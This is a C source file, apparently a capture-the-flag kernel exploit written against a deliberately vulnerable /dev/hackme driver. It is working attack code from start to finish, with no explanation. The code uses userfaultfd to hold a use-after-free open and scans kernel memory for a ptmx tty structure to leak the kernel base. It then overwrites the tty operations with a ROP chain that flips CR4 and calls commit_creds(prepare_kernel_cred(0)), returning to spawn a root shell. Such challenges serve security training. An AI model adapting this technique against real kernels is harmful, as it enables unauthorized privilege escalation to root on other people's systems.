/*
 * main.c
 * Copyright (C) 2019 hzshang <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */
// gcc exp.c -o exp --static -lpthread
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <linux/prctl.h>
#include <stdint.h>

const char *str = "hello,world";
struct {
    uint32_t idx;
    void* ptr;
    uint64_t size;
    uint64_t pc;
} io;
#define ADD 0x30000
#define DEL 0x30001
#define EDIT 0x30002
#define SHOW 0x30003
void print_buf(uint64_t * buf,int length){
    for(int i = 0;i<length-1;i+=2){
        printf("0x%02x:0x%016lx\t0x%016lx\n",8*i,buf[i],buf[i+1]);
    }
    if(length%2)
        printf("0x%02x:0x%016lx\n",length-1,buf[length-1]);
}
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while(0)
void debug(){
    getchar();
}
void handler(void *arg){
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;
    uffd = (long) arg;
    if (page == NULL) {
        page = mmap(NULL,0x2000,7,0x22,-1,0);
        if(page == MAP_FAILED)
            errExit("mmap");
        printf("page address:%p\n",page);
    }

    while(1){
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd,1,-1);
		printf("trigger! I'm going to hang\n");
        while(1){
            sleep(10);
        }
    }
}

size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
    __asm__("mov %%cs, %0\n"
            "mov %%ss,%1\n"
            "mov %%rsp,%2\n"
            "pushfq\n"
            "pop %3\n"
            "mov %%gs,%4\n"
            "mov %%es,%5\n"
            "mov %%fs,%6\n"
            "mov %%ds,%7\n"
            ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
            "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
            );
    puts("[*]status has been saved.");
}
void sh(){
    system("sh");
    exit(0);
}
int (*commit_creds)(unsigned long cred);
unsigned long (*prepare_kernel_cred)(unsigned long cred);

void sudo(){
    commit_creds(prepare_kernel_cred(0));
    asm(
    "push %0\n"
    "push %1\n"
    "push %2\n"
    "push %3\n"
    "push %4\n"
    "push $0\n"
    "swapgs\n"
    "pop %%rbp\n"
    "iretq\n"
    ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&sh)
    );
}

int main(int argc, char *argv[]){
    save_status();
    int fd = open("/dev/hackme",0);
    io.idx = 0;
#define SIZE 0x200000
    char *buffer = malloc(SIZE);
    printf("malloc buffer %p\n",buffer);
    io.ptr = buffer;
    io.size = SIZE;
    int ret = ioctl(fd,ADD,&io);
    ioctl(fd,DEL,&io);
    pid_t pid = fork();
    if(!pid){
        pthread_t thr;
        struct uffdio_api uffdio_api;
        struct uffdio_register uffdio_register;
        char* addr;

        uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        uffdio_api.api = UFFD_API;
        uffdio_api.features = 0;
        if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
            errExit("ioctl-UFFDIO_API");

#define ADDRESS 0xdead000
        addr = mmap((void*)ADDRESS,0x1000,7,0x22,-1,0);
        printf("mmap address:%p\n",addr);
        if(addr == MAP_FAILED){errExit("mmap");}

        uffdio_register.range.start = (unsigned long) addr;
        uffdio_register.range.len = 0x1000;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
        if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
            errExit("ioctl-UFFDIO_REGISTER");
        int s = pthread_create(&thr,NULL,handler,(void*)uffd);
        if(s !=0){errno=s;errExit("pthread_create");}
        io.idx = 0;
        io.size = 0x300;
        io.ptr = addr;
        ret = ioctl(fd,ADD,&io);
        printf("never come here!\n");
        exit(1);
    }
    // wait child
    sleep(1);
    int ptmx_fd = open("/dev/ptmx",0);
    int cnt=0;
    uint64_t buf[0x200/8];
    memset(buf,'a',0x200);
    io.idx = 0;
    io.pc = 0;
    io.size = 0x200;
    io.ptr = buf;
    uint64_t cmp = 0x0000000100005401;
    printf("searching...\n");
    int mark = 0;
    while(cnt++<0x1000 && !mark){
        io.pc += 0x200;
        ioctl(fd,SHOW,&io);
        for(int i=0;i<0x200/8;i++){
            if (cmp == buf[i]){
                printf("find ptmx struct\n");
                mark = 1;
                io.pc += i*8;
                break;
            }
        }
    }
    ioctl(fd,SHOW,&io);
    uint64_t kernel_base = buf[3] - 0x617b40 - 0xe240;
    prepare_kernel_cred = 0x4d3d0 + kernel_base;
    commit_creds = 0x4d220+kernel_base;
        
    printf("kernel base: 0x%lx\n",kernel_base);
    uint64_t heap_addr = buf[7] - 0x38;
    printf("heap base: 0x%lx\n",heap_addr);
    buf[3] = heap_addr + 0x100;
    for(int i=0;i<0x10;i++){
        buf[0x20+i] = kernel_base + 0x5DBEF;
    }
    buf[0x38/8] = heap_addr+0x80;
    buf[(0x80+0xc8)/8] = kernel_base + 0x200f66;
    // pop r12
#define OFF 0x10
    buf[OFF] = kernel_base + 0x1b5a1;
    buf[OFF+1] = 0x6f0;
    buf[OFF+2] = kernel_base + 0x032FC0;
    buf[OFF+3] = 1;
    buf[OFF+4] = 2;
    buf[OFF+5] = 3;
    buf[OFF+6] = 4;
    buf[OFF+7] = &sudo;
    ioctl(fd,EDIT,&io);
    ioctl(ptmx_fd,0x123456789abcde,0x234567890abcdef);

    return 0;
}





